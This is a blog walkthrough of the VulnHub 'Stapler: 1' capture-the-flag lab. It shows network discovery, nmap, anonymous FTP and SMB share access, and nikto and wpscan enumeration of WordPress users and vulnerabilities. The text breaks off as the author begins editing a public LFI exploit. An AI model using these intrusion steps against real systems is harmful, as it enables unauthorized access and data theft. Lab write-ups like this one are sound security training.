---
layout: single
title: "VulnHub 'Stapler: 1' - CTF"
header:
  teaser: oth.png
  overlay_image: stapler-banner.jpg
  caption: "[__VulnHub__](https://www.vulnhub.com/entry/stapler-1,150/)"
related: true
comments: true
---

Welcome back to my 2nd - VulnHub CTF! This time we will be tackling [Stapler: 1]((https://www.vulnhub.com/entry/stapler-1,150/)!

So if you're ready... let's strap in - and pwn this box!

## Description:
```
+---------------------------------------------------------+
|                                                         |
|                                  __..--''\              |
|                          __..--''         \             |
|                  __..--''          __..--''             |
|          __..--''          __..--''       |             |
|          \ o        __..--''____....----""              |
|           \__..--''\                                    |
|           |         \                                   |
|          +----------------------------------+           |
|          +----------------------------------+           |
|                                                         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|   Name: Stapler           |          IP: DHCP           |
|   Date: 2016-June-08      |        Goal: Get Root!      |
| Author: g0tmi1k           | Difficultly: ??? ;)         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|                                                         |
| + Average beginner/intermediate VM, only a few twists   |
|   + May find it easy/hard (depends on YOUR background)  |
|   + ...also which way you attack the box                |
|                                                         |
| + It SHOULD work on both VMware and Virtualbox          |
|   + REBOOT the VM if you CHANGE network modes           |
|   + Fusion users, you'll need to retry when importing   |
|                                                         |
| + There are multiple methods to-do this machine         |
|   + At least two (2) paths to get a limited shell       |
|   + At least three (3) ways to get a root access        |
|                                                         |
| + Made for BsidesLondon 2016                            |
|   + Slides: https://download.vulnhub.com/media/stapler/ |
|                                                         |
| + Thanks g0tmi1k, nullmode, rasta_mouse & superkojiman  |
|   + ...and shout-outs to the VulnHub-CTF Team =)        |
|                                                         |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                                                         |
|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
|                                                         |
+---------------------------------------------------------+
```

## The Hack:

If you already read my previous post, on the [Mr. Robot VM](https://jhalon.github.io/vulnhub-mr-robot1/) then you would already know, that the first thing we have to do (considering this is a pentest) is to [enumerate](https://www.securitywizardry.com/index.php/products/scanning-products/network-enumerators.html)!

As mentioned previously- if you want to learn more about the proper procedures and steps then I suggest you read the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page).

So let's start the process with running `netdiscover` on our network to find the IP of our Attack Target.

```console
 Currently scanning: 192.168.23.0/16   |   Screen View: Unique Hosts           
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     00:26:f2:0c:b3:82      1      60  NETGEAR                     
 192.168.1.3     d8:cb:8a:bf:d0:59      1      60  Micro-Star INTL CO., LTD.   
 192.168.1.13    08:00:27:3d:e7:21      1      60  Cadmus Computer Systems 
```

The IP of **192.168.1.13** will be our target. WE can now proceed to running an nmap scan to enumerate any open ports, services, versions, and OS's.

```console
root@kali:~# nmap -sS -A -O -n -p1-60000 192.168.1.13

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-04 18:33 CDT
Nmap scan report for 192.168.1.13
Host is up (0.00036s latency).
Not shown: 59988 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|   id.server: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, FoundRows, Support41Auth, LongPassword, ODBCClient, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsTransactions, SupportsCompression, LongColumnFlag, InteractiveClient, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: "_.\x01\x03zSl\x02\x11Td\x14\x0B(.V1x\x10\x00
|_  Auth Plugin Name: 88
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
---snip---
Host script results:
|_clock-skew: mean: -4h59m59s, deviation: 0s, median: -4h59m59s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED
|   Domain name: 
|   FQDN: red
|_  System time: 2016-10-04T19:35:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms 192.168.1.13

Post-scan script results:
| clock-skew: 
|_  -4h59m59s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.02 seconds
```

We can see that there are a ton of ports open that can be valuable to us: including FTP, NetBIOS (w/ SMB Shares), MySQL, and Port 12380 running a Web Server (Apache HTTPD).

The first thing that caught my eye, was the fact that FTP was allowing anonymous logins. So I made this my first target. Let's go ahead and login to FTP with the username: **anonymous** and the password: **anonymous**.

```console
root@kali:~# ftp 192.168.1.13
Connected to 192.168.1.13.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.1.13:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03 23:06 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (100.3767 kB/s)
ftp> exit

221 Goodbye.
```

We can see that after looking though the FTP server we come across a file called **note**. What we did is called the **get** command to download the file back to our host. WE can now open it and see what it contains.

```console
root@kali:~# cat note
Elly, make sure you update the payload information. Leave it in your FTP account once you’re are done, John.
```

Nothing too interesting in there - but we do have a name. We can save this name for later uses; such as user enumeration, brute forcing, etc.

After FTP, I followed up with SSH to see if I can log in with root.

```console
root@kali:~# ssh root@192.168.1.13
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
root@192.168.1.13's password: 
Permission denied, please try again.
```

This unfortunately didn't provide me with anything - except a name - so I moved on.

My next target focused around TCP port 139, which was an open netbio-ssn. I decided to use `smbclient` to see if I can't enumerate any of the SMB Shares. When prompted for the root password, I just typed in **root**.

```console
root@kali:~# smbclient -L 192.168.1.13
WARNING: The "syslog" option is deprecated
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Server               Comment
	---------            -------
	RED                  red server (Samba, Ubuntu)

	Workgroup            Master
	---------            -------

WORKGROUP            RED
```

The thing that really caught my attention was the comment - **Fred, What are we doing here?**. This led me to believe that Fred had access to kathy's share. So what I attempted to do was to connect to kathy's share, on the networked user/computer fred.

```console
root@kali:~# smbclient //fred/kathy -I 192.168.1.13 -N
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Fri Jun  3 11:52:52 2016
  ..                                  D        0  Mon Jun  6 16:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 10:02:27 2016
  backup                              D        0  Sun Jun  5 10:04:14 2016

		19478204 blocks of size 1024. 16396996 blocks available
```

Nice! Looks like we were able to establish a connection! From here, let's go and enumerate the files and folder on the share. And if we find something we like - we can use the `get` command to download it.

```console
smb: \> cd kathy_stuff
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 10:02:27 2016
  ..                                  D        0  Fri Jun  3 11:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 10:02:27 2016

		19478204 blocks of size 1024. 16396996 blocks available
smb: \kathy_stuff\> get todo-list.txt
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \kathy_stuff\> cd ..
smb: \> ls
  .                                   D        0  Fri Jun  3 11:52:52 2016
  ..                                  D        0  Mon Jun  6 16:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 10:02:27 2016
  backup                              D        0  Sun Jun  5 10:04:14 2016

		19478204 blocks of size 1024. 16396996 blocks available
smb: \> cd backup
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 10:04:14 2016
  ..                                  D        0  Fri Jun  3 11:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 10:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 12:14:46 2015

		19478204 blocks of size 1024. 16396996 blocks available
smb: \backup\> get vsftpd.conf 
getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (1940.4 KiloBytes/sec) (average 118.2 KiloBytes/sec)
smb: \backup\> get wordpress-4.tar.gz
getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (22780.8 KiloBytes/sec) (average 16717.0 KiloBytes/sec)

smb: \> exit
```

Once we are done with kathy's share, we can go ahead and login to the tmp share and do the same.

```console
root@kali:~# smbclient //fred/tmp -I 192.168.1.13 -N
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Tue Jun  7 03:08:39 2016
  ..                                  D        0  Mon Jun  6 16:39:56 2016
  ls                                  N      274  Sun Jun  5 10:32:58 2016

		19478204 blocks of size 1024. 16396996 blocks available
smb: \> get ls
getting file \ls of size 274 as ls (13.4 KiloBytes/sec) (average 13.4 KiloBytes/sec)
smb: \> exit
```

Out of the files we got, it seems we got a WordPress Backup, a FTP Configuration file, an LS file, and a to-do-list.

Let's open the Note and LS file to see if we can't find anything interesting

```console
root@kali:~# cat to-do-list.txt
I'm making sure to backup anything important for Initech, Kathy
root@kali:~# cat ls
.:
total 12.0K
drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
-rw-r--r--  1 root root    0 Jun  5 16:32 ls
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
```

From the to-do-list we have another name, and from LS it seems we got a private system file... for now I will skip this as nothing showed up in the Samba Enumeration.

We will move on and try to access the web server this time. We can navigate to **192.168.1.13:12380** to access the Apache Web Server. Once done so, we will be presented with the following.

<a href="/images/stapler1.png"><img src="/images/stapler1.png"></a>

My first choice was to look at the websites source code to see if there aren't any clues left... unfortunately there wasn't. So I decided to fire up and run a nikto scan on the web server to check for any vulnerabilities and misconfigurations.

```console


root@kali:~# nikto -h 192.168.1.13:12380
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.13
+ Target Hostname:    192.168.1.13
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2016-10-04 19:44:23 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.1.13' does not match certificate's names: Red.Initech
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7690 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2016-10-04 19:47:05 (GMT-5) (162 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Interestingly enough, I got presented with 4 directories: **/phpmyadin/**, **/blogblog/**, **/admin112233/**, and of course **/robots.txt**.

My initial attempts to try and navigate to the directories were futile, as the page kept going back to the home page. So I decided to add **http://** before the IP and try again. I entered the following url **https://192.168.1.13:12380/robots.txt**, and behold - I got the robots.txt page!

```console
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

From here, I decided to try and navigate to **/admin112233/** as it seemed the most interesting to me.

<a href="/images/stapler2.png"><img src="/images/stapler2.png"></a>

Damnit! Okay, we all love to play tricks on people - but this nearly gave me a heart attack... Let's try the **/bloglbog/** page now.

<a href="/images/stapler3.png"><img src="/images/stapler3.png"></a>

The blog really didn't contain much information for us - except a few names - as well as the name of the poster. I also saw on the page that there was a "login" section. Navigating to that took me to a WordPress login page... so instead of logging in, why not run WPScan - and let's see if we can't enumerate and users, plugins, and vulnerabilities.

```console
root@cryptic:~# wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://192.168.1.13:12380/blogblog/
[+] Started: Tue Oct  4 20:09:24 2016

[!] The WordPress 'https://192.168.1.13:12380/blogblog/readme.html' file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn't look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: https://192.168.1.13:12380/blogblog/wp-login.php?action=register
[+] XML-RPC Interface available under: https://192.168.1.13:12380/blogblog/xmlrpc.php
[!] Upload directory has directory listing enabled: https://192.168.1.13:12380/blogblog/wp-content/uploads/
[!] Includes directory has directory listing enabled: https://192.168.1.13:12380/blogblog/wp-includes/

[+] WordPress version 4.2.1 identified from advanced fingerprinting (Released on 2015-04-27)
[!] 23 vulnerabilities identified from the version number

[!] Title: WordPress 4.1-4.2.1 - Genericons Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7979
    Reference: https://codex.wordpress.org/Version_4.2.2
[i] Fixed in: 4.2.2

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection 
    Reference: https://wpvulndb.com/vulnerabilities/8126
    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
    Reference: https://wpvulndb.com/vulnerabilities/8130
    Reference: https://core.trac.wordpress.org/changeset/33536
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
    Reference: https://core.trac.wordpress.org/changeset/33529
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8132
    Reference: https://core.trac.wordpress.org/changeset/33541
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8133
    Reference: https://core.trac.wordpress.org/changeset/33549
    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8187
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - Publish Post & Mark as Sticky Permission Issue
    Reference: https://wpvulndb.com/vulnerabilities/8188
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
[i] Fixed in: 4.2.5

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8358
    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
[i] Fixed in: 4.2.6

[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8376
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36435
    Reference: https://hackerone.com/reports/110801
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
[i] Fixed in: 4.2.7

[!] Title: WordPress 3.7-4.4.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8377
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36444
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
[i] Fixed in: 4.2.7

[!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
    Reference: https://wpvulndb.com/vulnerabilities/8473
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
    Reference: https://wpvulndb.com/vulnerabilities/8474
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8475
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
[i] Fixed in: 4.5

[!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8488
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
    Reference: https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
[i] Fixed in: 4.5.2

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
    Reference: https://wpvulndb.com/vulnerabilities/8489
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
    Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
    Reference: http://avlidienbrunn.com/wp_some_loader.php
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
[i] Fixed in: 4.2.8

[!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
    Reference: https://wpvulndb.com/vulnerabilities/8518
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
[i] Fixed in: 4.2.9

[!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/8519
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
    Reference: https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
[i] Fixed in: 4.2.9

[!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
    Reference: https://wpvulndb.com/vulnerabilities/8520
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
[i] Fixed in: 4.2.9

[!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
    Reference: https://wpvulndb.com/vulnerabilities/8615
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
    Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
    Reference: http://seclists.org/fulldisclosure/2016/Sep/6
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
[i] Fixed in: 4.2.10

[!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
    Reference: https://wpvulndb.com/vulnerabilities/8616
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
[i] Fixed in: 4.2.10

[+] WordPress theme in use: bhost - v1.2.9

[+] Name: bhost - v1.2.9
 |  Location: https://192.168.1.13:12380/blogblog/wp-content/themes/bhost/
 |  Readme: https://192.168.1.13:12380/blogblog/wp-content/themes/bhost/readme.txt
[!] The version is out of date, the latest version is 1.3.3
 |  Style URL: https://192.168.1.13:12380/blogblog/wp-content/themes/bhost/style.css
 |  Theme Name: BHost
 |  Theme URI: Author: Masum Billah
 |  Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This the...
 |  Author: Masum Billah
 |  Author URI: http://getmasum.net/
 
[+] Enumerating usernames ...
[+] Identified the following 10 user/s:
    +----+---------+-----------------+
    | Id | Login   | Name            |
    +----+---------+-----------------+
    | 1  | john    | John Smith      |
    | 2  | elly    | Elly Jones      |
    | 3  | peter   | Peter Parker    |
    | 4  | barry   | Barry Atkins    |
    | 5  | heather | Heather Neville |
    | 6  | garry   | garry           |
    | 7  | harry   | harry           |
    | 8  | scott   | scott           |
    | 9  | kathy   | kathy           |
    | 10 | tim     | tim             |
    +----+---------+-----------------+


[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating all plugins (may take a while and use a lot of system resources) ...

   Time: 00:06:11 <=====================> (62804 / 62804) 100.00% Time: 00:06:11

[+] We found 4 plugins:

[+] Name: advanced-video-embed-embed-videos-or-playlists - v1.0
 |  Latest version: 1.0 (up to date)
 |  Location: https://192.168.1.13:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 |  Readme: https://192.168.1.13:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
[!] Directory listing is enabled: https://192.168.1.13:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/

[+] Name: akismet
 |  Latest version: 3.2 
 |  Location: https://192.168.1.13:12380/blogblog/wp-content/plugins/akismet/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: shortcode-ui - v0.6.2
 |  Latest version: 0.6.2 (up to date)
 |  Location: https://192.168.1.13:12380/blogblog/wp-content/plugins/shortcode-ui/
 |  Readme: https://192.168.1.13:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
[!] Directory listing is enabled: https://192.168.1.13:12380/blogblog/wp-content/plugins/shortcode-ui/

[+] Name: two-factor
 |  Latest version: 0.1-dev-20160412 
 |  Location: https://192.168.1.13:12380/blogblog/wp-content/plugins/two-factor/
 |  Readme: https://192.168.1.13:12380/blogblog/wp-content/plugins/two-factor/readme.txt
[!] Directory listing is enabled: https://192.168.1.13:12380/blogblog/wp-content/plugins/two-factor/


[+] Finished: Tue Oct  4 20:09:29 2016
[+] Requests Done: 37
[+] Memory used: 32.523 MB
[+] Elapsed time: 00:00:04
```

After doing some research, I found out that the **advanced-video-embed-embed-videos-or-playlists** was vulnerable to a [LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion) Exploit. Which can be found [here!](https://www.exploit-db.com/exploits/39646/)

Upon downloading the exploit, and running it, I was presented with an SSL error... So I went ahead and edited the code to include the following

```python
import ssl
